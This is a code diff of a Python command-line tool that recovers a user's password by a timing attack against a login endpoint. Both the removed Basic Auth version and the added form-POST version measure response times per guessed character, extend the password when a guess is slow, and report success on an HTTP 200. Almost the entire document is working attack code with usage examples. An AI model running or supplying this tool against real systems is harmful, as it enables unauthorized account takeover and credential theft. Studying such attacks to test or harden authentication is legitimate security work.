@@ -1,98 +1,88 @@
-import argparse
 import requests
 import time
+import argparse
 import statistics
 import string
-import concurrent.futures
+import sys
 
-def log(msg, log_file):
-    print(msg)
-    with open(log_file, "a") as f:
-        f.write(msg + "\n")
 
-def measure_time(url, username, guess):
-    start = time.time()
-    response = requests.get(url, auth=(username, guess))
-    elapsed = time.time() - start
-    return elapsed, response.status_code
+def log(message, file=None):
+    print(message)
+    if file:
+        with open(file, "a") as f:
+            f.write(message + "\n")
 
-def avg_time_for_char(url, username, base_password, char, samples, threads):
-    guess = base_password + char
 
-    def task():
-        elapsed, _ = measure_time(url, username, guess)
-        return elapsed
+def measure_baseline(url, username, attempts, password_len=5):
+    timings = []
+    dummy_password = "x" * password_len
+    for _ in range(attempts):
+        start = time.time()
+        requests.post(url, data={"username": username, "password": dummy_password})
+        end = time.time()
+        timings.append(end - start)
+    avg = sum(timings) / len(timings)
+    stddev = statistics.stdev(timings) if len(timings) > 1 else 0
+    return avg, stddev
 
-    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
-        times = list(executor.map(lambda _: task(), range(samples)))
 
-    return statistics.mean(times)
+def try_password(url, username, password, attempts):
+    timings = []
+    status_code = None
+    for _ in range(attempts):
+        start = time.time()
+        response = requests.post(url, data={"username": username, "password": password})
+        end = time.time()
+        timings.append(end - start)
+        status_code = response.status_code
+    avg = sum(timings) / len(timings)
+    return avg, status_code
 
-def main():
-    epilog_text = """
-Example Usage:
-  python attack.py -l http://target/auth -u admin -s p4 -n 5 -t 10 -c abcdef1234 -f log.txt
 
-This tool performs a timing attack on an HTTP Basic Auth endpoint.
-It uses multiple samples and threads to detect timing differences
-in password character matching.
-    """
+def dynamic_timing_attack(url, username, charset, attempts, threshold_factor, start_prefix, log_file):
+    password = start_prefix
+    baseline, stddev = measure_baseline(url, username, attempts, password_len=len(start_prefix) + 1)
+    threshold = baseline + (stddev * threshold_factor)
+    log(f"[*] Baseline: {baseline:.4f}s | StdDev: {stddev:.4f}s | Threshold: {threshold:.4f}s\n", log_file)
 
-    parser = argparse.ArgumentParser(
-        description="HTTP Basic Auth Timing Attack Tool",
-        epilog=epilog_text,
-        formatter_class=argparse.RawDescriptionHelpFormatter
-    )
-
-    parser.add_argument("-u", "--username", required=True, help="Username")
-    parser.add_argument("-l", "--url", required=True, help="Target URL")
-    parser.add_argument("-s", "--start", default="", help="Known start of the password")
-    parser.add_argument("-c", "--charset", default=string.printable, help="Character set to try")
-    parser.add_argument("-n", "--samples", type=int, default=5, help="Number of timing samples per character")
-    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of concurrent threads")
-    parser.add_argument("-f", "--log", default="attack_log.txt", help="Log file name")
-
-    args = parser.parse_args()
-
-    with open(args.log, "w") as f:
-        f.write("=== Timing Attack Log ===\n")
-
-    log("[*] Measuring baseline response time...", args.log)
-    baseline_times = []
-    fake_guess = args.start + "#"
-    for _ in range(10):
-        t, _ = measure_time(args.url, args.username, fake_guess)
-        baseline_times.append(t)
-
-    baseline = statistics.mean(baseline_times)
-    stddev = statistics.stdev(baseline_times)
-    threshold = baseline + 2 * stddev
-
-    log(f"[*] Baseline: {baseline:.4f}s | StdDev: {stddev:.4f}s | Threshold: {threshold:.4f}s\n", args.log)
-
-    password = args.start
     while True:
         found_char = False
-        for char in args.charset:
+        for char in charset:
             guess = password + char
-            avg_elapsed = avg_time_for_char(args.url, args.username, password, char, args.samples, args.threads)
-            _, status_code = measure_time(args.url, args.username, guess)
+            avg_elapsed, status_code = try_password(url, username, guess, attempts)
 
-            log(f"Trying: '{guess}' | Avg Time: {avg_elapsed:.4f}s", args.log)
+            log(f"Trying: '{guess}' | Avg Time: {avg_elapsed:.4f}s", log_file)
 
             if status_code == 200:
-                log(f"\n[+] SUCCESS! Password is: {guess}", args.log)
+                log(f"\n[+] SUCCESS! Password is: {guess}", log_file)
                 return
 
             if avg_elapsed > threshold:
-                log(f"--> '{char}' is likely correct (avg time = {avg_elapsed:.4f}s)\n", args.log)
+                log(f"--> '{char}' is likely correct (avg time = {avg_elapsed:.4f}s)\n", log_file)
                 password += char
                 found_char = True
                 break
 
         if not found_char:
-            log("[!] No likely character found. Stopping.", args.log)
-            break
+            log("\n[-] Failed to find next character. Attack may have stalled or password ended.", log_file)
+            return
+
 
 if __name__ == "__main__":
-    main()
+    parser = argparse.ArgumentParser(description="Timing Attack Password Guesser")
+    parser.add_argument("-l", "--url", required=True, help="Login URL")
+    parser.add_argument("-u", "--username", required=True, help="Username")
+    parser.add_argument("-c", "--charset", default=string.ascii_lowercase, help="Character set to use")
+    parser.add_argument("-n", "--attempts", type=int, default=5, help="Number of attempts per guess")
+    parser.add_argument("-t", "--threshold", type=float, default=10.0, help="Threshold factor (multiplier of stddev)")
+    parser.add_argument("-s", "--start", default="", help="Initial known prefix of the password")
+    parser.add_argument("-f", "--log", default=None, help="Log file")
+
+    args = parser.parse_args()
+
+    try:
+        dynamic_timing_attack(args.url, args.username, args.charset, args.attempts,
+                              args.threshold, args.start, args.log)
+    except KeyboardInterrupt:
+        print("\n[!] Interrupted by user. Exiting...")
+        sys.exit(1)
